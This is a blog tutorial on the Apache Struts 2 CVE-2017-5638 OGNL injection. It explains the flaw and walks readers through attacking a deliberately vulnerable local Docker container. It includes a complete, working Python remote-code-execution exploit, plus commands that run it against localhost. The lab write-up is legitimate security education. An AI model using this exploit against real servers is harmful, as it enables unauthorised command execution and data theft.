+++ 
draft = false
date = 2022-02-15T18:31:43-05:00
title = "Apache Struts 2 CVE-2017-5638 Docker Container"
description = "A look into a containerized version of another Apache vulnerability"
slug = ""
authors = []
tags = []
categories = []
externalLink = ""
series = []
+++
In line with the recent [Apache Log4j CVE-2021-44832](https://www.codingwithcarl.com/posts/2021-12-14-log4j/), and since we're exploring [Docker](https://www.codingwithcarl.com/posts/2021-11-30-docker/) containers, I think its the perfect time to explore another Apache vulnerability. In this post, we'll be look at Apache Struts 2.

### CVE-2017-5638

Apache Struts is a popular framework for developing web applications. Like Log4j, it's written in Java. In 2017, a vulnerability was discovered. An attacker could perform remote code execution on a victim server. One of the victims, Equifax, suffered a catastrophic data breach.

The vulnerable code was in the Jakarta Multipart parser. If the Content-Type value isn’t valid, that is, it does not match an expected valid type, an exception is thrown that is then used to display an error message to a user. In this case, we can set the Content-Type to an OGNL expression such as:

`Content-Type: ${(#_='multipart/form-data')`

The vulnerability occurs because the Content-Type is not escaped after the error, and is then used by LocalizedTextUtil.findText function to build the error message. This function will interpret the supplied message, and anything within ${…} will be treated as an Object Graph Navigation Library (OGNL) expression and evaluated as such. The attacker can leverage these conditions to execute OGNL expressions that in turn execute system commands. This is almost similar to Log4j where commands and arbitrary code could be executed directly from the logger.

### Getting the Container & Exploit

The vulnerable version of Struts 2 is available as a docker container here: [Apache Struts 2 CVE-2017-5638 Container](https://hub.docker.com/r/piesecurity/apache-struts2-cve-2017-5638). We will deploy the container and run the exploit to test it out. This will show us how third party frameworks, like Apache Struts 2, can be exploited even when running in a container environment, such as Docker.

1. Ensure you have an account at [Docker Hub](hub.docker.com/signup)

2. Log into Docker Hub from your local Docker instance with [docker login](https://docs.docker.com/engine/reference/commandline/login/)

3. Run the following commands to pull and run the vulnerable container:

    ```bash
    docker pull piesecurity/apache-struts2-cve-2017-5638
    ```

    ```bash
    docker run -d -p 9080:8080 --rm --name apache piesecurity/apache-struts2-cve-2017-5638
    ```

4. If you don't have Python, [install it](https://www.python.org/downloads/)

5. Create a Python script called `exploit.py` and copy/paste the following code into it:

    ```python
    import http.client
    import urllib.error
    import urllib.parse
    import urllib.request


    def exploit(url, cmd):
        payload = "%{(#_='multipart/form-data')."
        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        payload += "(#_memberAccess?"
        payload += "(#_memberAccess=#dm):"
        payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        payload += "(#ognlUtil.getExcludedPackageNames().clear())."
        payload += "(#ognlUtil.getExcludedClasses().clear())."
        payload += "(#context.setMemberAccess(#dm))))."
        payload += "(#cmd='%s')." % cmd
        payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
        payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
        payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
        payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        payload += "(#ros.flush())}"
        try:
            headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
            request = urllib.request.Request(url, headers=headers)
            page = urllib.request.urlopen(request).read()
        except http.client.IncompleteRead as e:
            page = e.partial
        print(page)
        return page


    if __name__ == '__main__':
        import sys

        if len(sys.argv) != 3:
            print("[*] str.py <url> <cmd>")
        else:
            print('[*]CVE: 2017-5638 - Apache Struts2 S2-045')
            url = sys.argv[1]
            cmd = sys.argv[2]
            print(("[*] cmd: %s\n" % cmd))
            exploit(url, cmd)
    ```

### Hacking

1. Run `docker ps` from the terminal to check that the container is running.

2. Once the struts container is running, go to [localhost:9080/](localhost:9080/) - you should see a welcome screen for Struts2 Showcase. 

3. Begin testing the RCE. You can now issue commands to the container outside of its shell with the following syntax:
    
    ```bash
    python exploit.py http://localhost:9080/ "whoami"
    ```

4. You'll see **b'root\n'** printed to the terminal if everything worked correctly. Replace `whoami` to experiment with other commands as if you were executing commands from within the container.

    - `pwd`
    - `ls`
    - `ls -la`

5. When you're finished, you can stop the docker with `docker stop apache`

### Summary

*Distrust, verify, and stay suspicious.*

I hope this demonstrates the importance of security when dealing with Docker containers and third party programs. Although in today's world, you probably shouldn't build everything from scratch (as you'll probably introduce more vulnerabilities if you don't know what you're doing) you should at least be aware of the risks when using any third party framework, library, or program - even if it is open source and audited. Always stay up to date on the latest security patches for your critical systems.

---

#### References / Additional Info

[Docker for Developers](https://www.packtpub.com/product/docker-for-developers/9781789536058)

[Apache Struts 2](https://struts.apache.org/)

[Apache Struts 2 CVE-2017-5638 Container](https://hub.docker.com/r/piesecurity/apache-struts2-cve-2017-5638)

[Apache Commons OGNL - Object Graph Navigation Library](https://commons.apache.org/proper/commons-ognl/)

[Exploit Demo for CVE-2017-5638](https://github.com/frankhuurman/struts2-rce)

[Equifax Data Breach](https://archive.epic.org/privacy/data-breach/equifax/)

[CVE-2017-5638: The Apache Struts vulnerability explained](https://www.synopsys.com/blogs/software-security/cve-2017-5638-apache-struts-vulnerability-explained/)

[CVE-2021-44228 - Log4j - MINECRAFT VULNERABLE!](https://youtu.be/7qoPDq41xhQ)
